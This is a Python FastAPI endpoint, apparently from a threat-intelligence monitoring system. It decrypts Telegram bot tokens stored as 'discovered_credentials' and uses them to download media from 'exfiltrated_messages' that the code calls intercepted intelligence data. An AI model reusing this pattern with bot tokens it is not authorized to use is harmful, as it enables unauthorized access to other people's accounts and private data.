import logging

from fastapi import APIRouter, Depends, HTTPException, Response
from telegram import Bot
from telegram.request import HTTPXRequest

from app.core.auth import require_monitor_key
from app.core.database import db
from app.core.security import security

logger = logging.getLogger("media_proxy")
router = APIRouter(dependencies=[Depends(require_monitor_key)])


@router.get("/{message_id}")
async def get_media(message_id: str):
    """Proxy media files from Telegram using the source bot token.

    Auth: X-Monitor-Key header required (see app.core.auth).
    The endpoint decrypts the source bot token in-process and fetches
    the file from Telegram, so accidentally exposing this to the public
    would enable UUID-enumeration exfiltration.
    """
    # 1. Look up the message
    try:
        msg_res = db.table("exfiltrated_messages") \
            .select("credential_id, file_meta, media_type") \
            .eq("id", message_id) \
            .single() \
            .execute()
    except Exception:
        raise HTTPException(status_code=404, detail="Message not found")

    row = msg_res.data
    if not row:
        raise HTTPException(status_code=404, detail="Message not found")

    file_meta = row.get("file_meta") or {}
    file_id = file_meta.get("file_id")
    if not file_id:
        raise HTTPException(status_code=404, detail="No media file_id available")

    credential_id = row.get("credential_id")
    if not credential_id:
        raise HTTPException(status_code=404, detail="No credential association")

    # 2. Get the source bot token
    try:
        cred_res = db.table("discovered_credentials") \
            .select("bot_token") \
            .eq("id", credential_id) \
            .single() \
            .execute()
    except Exception:
        raise HTTPException(status_code=404, detail="Credential not found")

    cred_row = cred_res.data
    if not cred_row or not cred_row.get("bot_token"):
        raise HTTPException(status_code=404, detail="Bot token unavailable")

    try:
        decrypted_token = security.decrypt(cred_row["bot_token"])
    except Exception:
        # Do NOT surface the decryption error — even the traceback string
        # can hint at the encryption backend / key format.
        logger.exception("media proxy: token decryption failed")
        raise HTTPException(status_code=500, detail="Token decryption failed")

    # 3. Download from Telegram
    try:
        request = HTTPXRequest(read_timeout=15.0, write_timeout=15.0)
        bot = Bot(token=decrypted_token, request=request)
        tg_file = await bot.get_file(file_id)
        file_bytes = await tg_file.download_as_bytearray()
    except Exception as e:
        # Log full error server-side, respond with generic 502.
        # `e` could include the bot token in a URL, so keep it out of the response.
        logger.warning(f"Failed to download media {message_id}: {e}")
        raise HTTPException(status_code=502, detail="Failed to fetch from Telegram")

    # 4. Determine content type
    mime = file_meta.get("mime") or file_meta.get("mime_type")
    media_type = row.get("media_type", "")
    if not mime:
        if media_type == "photo":
            mime = "image/jpeg"
        elif media_type == "video":
            mime = "video/mp4"
        elif media_type == "audio":
            mime = "audio/mpeg"
        else:
            mime = "application/octet-stream"

    # Cache-Control: no-store — media contains intercepted intelligence data;
    # do not let any intermediate proxy or browser retain a copy.
    return Response(
        content=bytes(file_bytes),
        media_type=mime,
        headers={"Cache-Control": "no-store"},
    )
